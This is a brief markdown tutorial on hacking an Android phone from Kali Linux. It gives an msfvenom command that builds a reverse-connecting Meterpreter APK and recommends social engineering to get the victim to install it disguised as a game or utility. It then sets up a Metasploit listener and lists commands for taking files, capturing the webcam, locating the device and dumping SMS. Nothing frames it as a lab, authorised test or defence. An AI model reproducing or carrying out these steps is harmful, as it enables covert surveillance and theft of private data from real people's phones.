#### **Attacker System**: Kali Linux

#### **Victim Device**: Android Phone

### **Steps to Create and Deliver the Payload**

1. **Generate the Malicious APK**  
    Use the following command to create the `.apk` file with malicious code:
    
    ```bash
    sudo msfvenom -p android/meterpreter/reverse_http LHOST=<attacker_ip> LPORT=<attacker_port> > hack.apk
    ```
    
    - Replace `<attacker_ip>` with the attacker's IP address.
    - Replace `<attacker_port>` with the desired port number.
    - You can try `reverse_ftp` instead of `reverse_http` for different payloads.
2. **Convince the Victim to Install the APK**
    
    - Use social engineering to make the victim install the APK file.
    - Disguise the file as a legitimate app (e.g., a game or utility).

### **Steps for the Hacking Process**

3. **Start Metasploit Framework**  
    Open Metasploit on Kali Linux:
    
    ```bash
    sudo msfconsole
    ```
    
4. **Set Up a Listener**  
    Use the following commands in Metasploit:
    
    ```bash
    use exploit/multi/handler
    set payload android/meterpreter/reverse_http
    set LHOST < ttacker_ip>
    set LPORT <attacker_port>
    exploit
    ```
    
5. **Wait for the Victim to Connect**
    
    - Once the victim installs and opens the malicious app, the device will connect back to the attacker's listener.
    - You’ll now have a **Meterpreter session**.
6. **Control the Victim's Device**  
    In the Meterpreter session, you can execute commands like:
    
    - **Access Files**:
        
        ```bash
        ls
        download <file_path>
        upload <file_path>
        ```
        
    - **Camera Control**:
        
        ```bash
        webcam_list
        webcam_snap
        ```
        
    - **GPS Location**:
        
        ```bash
        geolocate
        ```
        
    - **Read SMS**:
        
        ```bash
        dump_sms
        ```
